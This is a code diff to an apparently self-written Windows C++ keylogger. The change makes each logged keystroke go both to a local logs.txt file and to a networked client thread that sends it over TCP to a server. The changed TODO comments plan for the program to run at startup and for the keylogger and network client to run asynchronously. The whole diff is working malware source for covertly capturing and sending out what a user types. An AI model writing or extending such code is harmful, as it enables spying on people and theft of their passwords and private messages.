@@ -17,19 +17,22 @@
 #include <windows.h>
 #include <iostream>
 #include <fstream>
+#include <thread>
 
 void writeKeyStroke(int trueKey)
 {
     std::ofstream file;
     file.open("logs.txt", std::ios::app);
-        
+    char trueKeyC = static_cast<char>(trueKey);
     if (trueKey == ENTER)
     {
         file << "\n";
     } 
     else 
     {
-        file << static_cast<char>(trueKey);
+        std::thread clientThread(client, &trueKeyC);
+        file << trueKeyC;
+        clientThread.join();
     }
     file.close();
 }
@@ -38,11 +41,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     PSTR lpCmdLine, int nCmdShow)
 {
     //FreeConsole();
-    // testing client networking function.
-    const char *x = "hello from keylogger."; 
-    client(x);
-    return 1;
-    // end testing.
     Maps vkMaps;
     vkMaps.initializeMaps();
     while (1)
@@ -87,8 +85,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     in ks2server.cpp:
     ~ check documentation for ALL code files to ensure everything is written clearly, and concisely.
     ~ maybe seggregate the code that resolves dns to ipv4 format into a separate header file. 
-    ~ write code that sends and recieves keystroke data over the tcp connection.
     ~ ensure proper spacing between code statements to improve readability.
     ~ write code to schedule this program to be run on startup.
-    ~ we have implemented a send function, instead of sending a c style array, we must send keystrokes to the client IF there is a valid IP set.
+    ~ find a way to run keylogger and client model asynchronously.
 */
